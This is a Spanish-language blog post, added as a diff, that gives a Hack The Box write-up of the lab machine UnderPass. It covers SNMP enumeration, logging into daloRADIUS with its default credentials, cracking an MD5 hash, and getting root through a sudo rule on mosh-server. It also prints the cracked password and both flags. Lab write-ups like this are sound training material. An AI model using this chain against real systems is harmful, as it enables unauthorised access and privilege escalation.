@@ -1,0 +1,221 @@
+---
+layout: post
+
+title: Writeup UnderPass
+excerpt: 'En este writeup, compartiré el proceso que seguí para comprometer la máquina UnderPass en Hack The Box. A través de la enumeración SNMP, la explotación de credenciales por defecto de daloRADIUS, y la escalada de privilegios utilizando'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "Writeups"
+kicker_secondary: "Hack The Box"
+tags:
+- 'Hack The Box'
+
+
+post_title: "UnderPass"
+description: "En este writeup, compartiré el proceso que seguí para comprometer la máquina UnderPass en Hack The Box. A través de la enumeración SNMP, la explotación de credenciales por defecto de daloRADIUS, y la escalada de privilegios utilizando"
+
+slug: underpass-htb-writeup
+permalink: /blog/writeups/underpass-htb-writeup.html
+
+nav: blog
+
+featured: false
+featured_badge: ""
+featured_lines:  
+  - SNMP
+  - daloRADIUS
+  - mosh-server
+
+cover_badge: ""
+cover_lines:
+  - SNMP expuesto
+  - credenciales por defecto
+  - escalada con mosh-server
+  
+cover_image: /assets/img/blog/underpass/featured_image_underpass.jpg
+
+reading_time: "4 min de lectura"
+date: 2025-12-29 10:00:00 +0100
+
+toc_html: |
+  <a href="#1-introduccion">1. Introducción</a>
+  <a href="#2-reconocimiento-inicial">2. Reconocimiento Inicial</a>
+  <a href="#3-enumeracion-de-servicios">3. Enumeración de Servicios</a>
+  <a href="#4-cracking-del-hash-y-acceso-al-sistema">4. Cracking del Hash y Acceso al Sistema</a>
+  <a href="#5-escalada-de-privilegios">5. Escalada de Privilegios</a>
+  <a href="#6-obtencion-de-la-flag-de-root">6. Obtención de la Flag de Root</a>
+  <a href="#7-conclusion">7. Conclusión</a>
+  <a href="#8-referencias">8. Referencias</a>
+
+---
+<p>En este writeup, compartiré el proceso que seguí para comprometer la máquina <strong>UnderPass</strong> en Hack The Box.<!--more--> A través de la enumeración SNMP, la explotación de credenciales por defecto de <em>daloRADIUS</em>, y la escalada de privilegios utilizando <em>mosh-server</em>, logré obtener ambas flags.</p>
+<p><img src="/assets/img/blog/underpass/maquina.png" alt="alt text"></p>
+<h2 id="1-introduccion">1. Introducción</h2>
+<p><strong>Dificultad:</strong> Fácil <strong>Dirección IP:</strong> 10.10.11.48 <strong>Objetivo:</strong> Obtener la bandera de usuario y la de root. <strong>Herramientas utilizadas:</strong> nmap, snmp-check, gobuster, hashid, john the ripper</p>
+<h2 id="2-reconocimiento-inicial">2. Reconocimiento Inicial</h2>
+<p>En primer lugar guardé en la variable IP la IP del sistema objetivo y comprobé la conexión al mismo.</p>
+<p><img src="/assets/img/blog/underpass/prueba_conexion.png" alt="alt text"></p>
+<h3 id="2-1-escaneo-de-puertos-con-nmap">2.1. Escaneo de Puertos con Nmap</h3>
+<p>Comencé con un escaneo de puertos para identificar los servicios activos en la máquina. Utilicé los siguientes comandos:</p>
+<pre><code class="language-bash">
+sudo nmap -Pn -sS 10.10.11.48 -oA scan_TCP
+</code></pre>
+<p><img src="/assets/img/blog/underpass/scan_TCP.png" alt="alt text"></p>
+<pre><code class="language-bash">
+sudo nmap -p22,80 -sSCV 10.10.11.48 -oA scan_TCP_services
+</code></pre>
+<p><img src="/assets/img/blog/underpass/scan_TCP_services.png" alt="alt text"></p>
+<pre><code class="language-bash">
+sudo nmap -sU -F 10.10.11.48 -oA scan_UDP
+</code></pre>
+<p><img src="/assets/img/blog/underpass/scan_UDP.png" alt="alt text"></p>
+<p>En los resultados, detecté abiertos los puertos:</p>
+<ul>
+<li><strong>22 (SSH)</strong></li>
+<li><strong>80 (HTTP)</strong></li>
+<li><strong>161 (SNMP)</strong></li>
+</ul>
+<h2 id="3-enumeracion-de-servicios">3. Enumeración de Servicios</h2>
+<h3 id="3-1-enumeracion-snmp">3.1. Enumeración SNMP</h3>
+<p>Al ver que el puerto 161 estaba abierto, procedí a utilizar <strong>snmp-check</strong> para obtener información:</p>
+<pre><code class="language-bash">
+snmp-check -t 10.10.11.48
+</code></pre>
+<p>El escaneo reveló información interesante:</p>
+<ul>
+<li><strong>Hostname:</strong> UnDerPass.htb (indicando que es el único servidor <em>daloRADIUS</em> en la red).</li>
+<li><strong>Sistema:</strong> Linux underpass 5.15.0-126-generic (Ubuntu).</li>
+<li><strong>Contacto:</strong> steve@underpass.htb.</li>
+<li><strong>Ubicación:</strong> Nevada, U.S.A.</li>
+</ul>
+<p><img src="/assets/img/blog/underpass/snmp-check.png" alt="alt text"></p>
+<h3 id="3-2-investigacion-de-daloradius">3.2. Investigación de daloRADIUS</h3>
+<p>Dado que el escaneo SNMP reveló que el servidor ejecutaba <em>daloRADIUS</em>, busqué más información sobre esta aplicación.</p>
+<p><img src="/assets/img/blog/underpass/busqueda_daloradius.png" alt="alt text"></p>
+<p>Encontré su <a href="https://github.com/lirantal/daloradius">página en GitHub</a> y su <a href="https://github.com/lirantal/daloradius/wiki/Installation">wiki de instalación</a>.</p>
+<p>La wiki proporcionaba credenciales por defecto:</p>
+<ul>
+<li><strong>Usuario:</strong> administrator</li>
+<li><strong>Contraseña:</strong> radius</li>
+</ul>
+<p><img src="/assets/img/blog/underpass/testing_daloradius.png" alt="alt text"></p>
+<p>Además, mencionaba directorios de configuración que podrían estar expuestos.</p>
+<p><img src="/assets/img/blog/underpass/config_daloradius.png" alt="alt text"></p>
+<h3 id="3-3-enumeracion-web-con-gobuster">3.3. Enumeración Web con Gobuster</h3>
+<p>Con esta información, ejecuté <strong>gobuster</strong> para buscar directorios expuestos:</p>
+<pre><code class="language-bash">
+gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+</code></pre>
+<p><img src="/assets/img/blog/underpass/gobuster.png" alt="alt text"></p>
+<p>El escaneo encontró el siguiente directorio interesante:</p>
+<ul>
+<li><strong>/daloradius/app/operators/index.php</strong>: Al intentar acceder, fui redirigido a un panel de login en <strong>/daloradius/app/operators/login.php</strong>.</li>
+</ul>
+<h3 id="3-4-acceso-al-panel-de-daloradius">3.4. Acceso al Panel de daloRADIUS</h3>
+<p>Probé las credenciales por defecto en el panel de login:</p>
+<pre><code>
+Usuario: administrator
+Contraseña: radius
+</code></pre>
+<p><img src="/assets/img/blog/underpass/panel_acceso_daloradius.png" alt="alt text"></p>
+<p>Para mi suerte, las credenciales funcionaron y tuve acceso al panel de administración.</p>
+<p><img src="/assets/img/blog/underpass/dashboard_daloradius.png" alt="alt text"></p>
+<p>Dentro del panel, localicé la lista de usuarios y encontré un usuario llamado <strong>svcMosh</strong> con el siguiente hash de contraseña:</p>
+<pre><code>
+412DD4759978ACFCC81DEAB01B382403
+</code></pre>
+<p><img src="/assets/img/blog/underpass/lista_usuarios_daloradius.png" alt="alt text"></p>
+<h2 id="4-cracking-del-hash-y-acceso-al-sistema">4. Cracking del Hash y Acceso al Sistema</h2>
+<h3 id="4-1-identificacion-del-hash">4.1. Identificación del Hash</h3>
+<p>Utilicé <strong>hashid</strong> para identificar el tipo de hash:</p>
+<pre><code class="language-bash">
+hashid 412DD4759978ACFCC81DEAB01B382403
+</code></pre>
+<p><img src="/assets/img/blog/underpass/identificacion_de_hash.png" alt="alt text"></p>
+<p>El resultado indicó que se trataba de un hash <strong>MD5</strong>.</p>
+<h3 id="4-2-cracking-con-john-the-ripper">4.2. Cracking con John the Ripper</h3>
+<p>Con la identificación del hash, procedí a crackearlo usando <strong>John the Ripper</strong> y el diccionario <strong>rockyou.txt</strong>:</p>
+<pre><code class="language-bash">
+john --format=raw-md5 --wordlist=/home/kali/rockyou.txt hash.txt
+</code></pre>
+<p>En pocos segundos, John reveló la contraseña:</p>
+<pre><code>
+underwaterfriends
+</code></pre>
+<p><img src="/assets/img/blog/underpass/john.png" alt="alt text"></p>
+<h3 id="4-3-acceso-via-ssh">4.3. Acceso Vía SSH</h3>
+<p>Con las credenciales del usuario <strong>svcMosh</strong>, intenté conectarme al servicio SSH de la máquina:</p>
+<pre><code class="language-bash">
+ssh svcMosh@10.10.11.48
+</code></pre>
+<p>Ingresé la contraseña <strong>underwaterfriends</strong> y logre acceder exitosamente.</p>
+<p><img src="/assets/img/blog/underpass/ssh.png" alt="alt text"></p>
+<h3 id="4-4-obtencion-de-la-flag-de-usuario">4.4. Obtención de la Flag de Usuario</h3>
+<p>Una vez dentro, navegué hasta el directorio personal del usuario y encontré el archivo <strong>user.txt</strong>:</p>
+<pre><code class="language-bash">
+cat /home/svcMosh/user.txt
+</code></pre>
+<p>La flag de usuario era:</p>
+<pre><code>
+f7515bf03b0af43a7fd6e9fe5a872906
+</code></pre>
+<p><img src="/assets/img/blog/underpass/user-flag.png" alt="alt text"></p>
+<h2 id="5-escalada-de-privilegios">5. Escalada de Privilegios</h2>
+<h3 id="5-1-verificacion-de-permisos-sudo">5.1. Verificación de Permisos Sudo</h3>
+<p>Para explorar posibles caminos de escalada de privilegios, comprobé los comandos que el usuario svcMosh tiene permiso para ejecutar con privilegios elevados mediante sudo. Ejecuté:</p>
+<pre><code class="language-bash">
+sudo -l
+</code></pre>
+<p>El resultado mostró que el usuario <strong>svcMosh</strong> podía ejecutar el comando <strong>/usr/bin/mosh-server</strong> sin contraseña:</p>
+<pre><code>
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+</code></pre>
+<p><img src="/assets/img/blog/underpass/sudo.png" alt="alt text"></p>
+<h3 id="5-2-explotacion-de-mosh-server">5.2. Explotación de mosh-server</h3>
+<p>Revisé la ayuda de <strong>mosh-server</strong></p>
+<p><img src="/assets/img/blog/underpass/mosh-help.png" alt="alt text"></p>
+<p>Descubrí que el parámetro <code>--server</code> permitía la ejecución de comandos arbitrarios. Aproveché esto para obtener una shell como root:</p>
+<pre><code class="language-bash">
+mosh --server=&quot;sudo /usr/bin/mosh-server&quot; 127.0.0.1
+</code></pre>
+<p><img src="/assets/img/blog/underpass/acceso-root.png" alt="alt text"></p>
+<p>Al ejecutar el comando, obtuve acceso root. Verifiqué mi identidad con:</p>
+<pre><code class="language-bash">
+id
+</code></pre>
+<p>La salida confirmó que ahora era <strong>root</strong>.</p>
+<p><img src="/assets/img/blog/underpass/root.png" alt="alt text"></p>
+<h2 id="6-obtencion-de-la-flag-de-root">6. Obtención de la Flag de Root</h2>
+<p>Comprobé el contenido de la carpeta con</p>
+<pre><code class="language-bash">
+ls -lisah
+</code></pre>
+<p>Obtuve el fichero <code>root.txt</code> que contenía la flag de root.</p>
+<p><img src="/assets/img/blog/underpass/root-flag.png" alt="alt text"></p>
+<p>La flag de root era:</p>
+<pre><code>
+7998aa1e4a318a736bd8aa02ab54b779
+</code></pre>
+<h2 id="7-conclusion">7. Conclusión</h2>
+<p>El compromiso de la máquina <strong>UnderPass</strong> se logró combinando la enumeración SNMP y la explotación de configuraciones inseguras en <em>daloRADIUS</em>. La presencia de credenciales por defecto y el mal uso de permisos sudo en <strong>mosh-server</strong> facilitaron el acceso al sistema y la escalada de privilegios.</p>
+<p><strong>Lecciones aprendidas:</strong></p>
+<ul>
+<li>Siempre desactivar o proteger servicios como SNMP en entornos de producción.</li>
+<li>Cambiar las credenciales por defecto tras la instalación de cualquier software.</li>
+<li>Revisar cuidadosamente los permisos sudo, especialmente para comandos que pueden ser explotados para obtener acceso root.</li>
+</ul>
+<h2 id="8-referencias">8. Referencias</h2>
+<ul>
+<li><a href="https://tools.kali.org/information-gathering/snmp-check">SNMP-Check Documentation</a></li>
+<li><a href="https://github.com/lirantal/daloradius">daloRADIUS GitHub</a></li>
+<li><a href="https://github.com/lirantal/daloradius/wiki/Installation">daloRADIUS Wiki de Instalación</a></li>
+<li><a href="https://github.com/OJ/gobuster">Gobuster Documentation</a></li>
+<li><a href="https://www.openwall.com/john/">John the Ripper Documentation</a></li>
+<li><a href="https://github.com/blackploit/hash-identifier">HashID Documentation</a></li>
+<li><a href="https://mosh.org/">mosh-server Documentation</a></li>
+</ul>
